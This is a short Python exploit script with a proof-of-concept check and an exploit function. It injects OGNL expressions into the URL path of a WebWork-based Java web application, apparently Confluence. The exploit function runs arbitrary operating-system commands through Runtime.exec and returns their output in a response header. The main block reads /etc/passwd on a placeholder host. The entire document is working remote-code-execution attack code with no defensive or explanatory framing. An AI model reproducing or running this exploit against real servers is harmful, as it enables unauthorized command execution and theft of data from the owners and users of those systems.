import urllib.parse
import requests as req


def poc(target: str) -> bool:
    ognl_expr = """${(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Vul",true))}"""
    payload = "/%s/" % (ognl_expr)
    resp = req.get(target + "/%s/" % (urllib.parse.quote(payload)), verify=False, allow_redirects=False)
    return True if resp.headers.get("X-Vul", None) else False


def exp(target: str, cmd: str) -> str:
    ognl_expr = """${(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream())))}"""
    payload = "/%s/" % (ognl_expr)
    resp = req.get(target + "/%s/" % (urllib.parse.quote(payload)), params={'cmd': cmd}, verify=False, allow_redirects=False)
    return resp.headers.get("X-Cmd-Response", "Fail to exploit.")


if __name__ == '__main__':
    taget = "http://example.com"
    cmd = "cat /etc/passwd"
    if poc(taget):
        print(exp(taget, cmd))
